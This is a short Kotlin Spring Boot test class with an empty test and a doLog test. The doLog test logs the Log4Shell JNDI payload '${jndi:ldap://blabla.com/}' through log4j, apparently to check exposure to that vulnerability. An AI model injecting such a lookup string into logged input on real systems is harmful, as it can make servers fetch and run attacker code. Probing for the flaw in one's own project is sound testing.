package runstatic.stools.tool

import org.apache.logging.log4j.LogManager
import org.apache.logging.log4j.Logger
import org.junit.jupiter.api.Test
import org.springframework.boot.test.context.SpringBootTest
import runstatic.stools.logging.useSlf4jLogger

/**
 *
 * @author chenmoand
 */
@SpringBootTest
internal class SpringToolTest {

    private val logger = useSlf4jLogger()

    @Test
    fun getApplicationTest() {

    }

    @Test
    fun doLog() {
        val log: Logger = LogManager.getLogger()
        log.error("\${jndi:ldap://blabla.com/}")
    }

}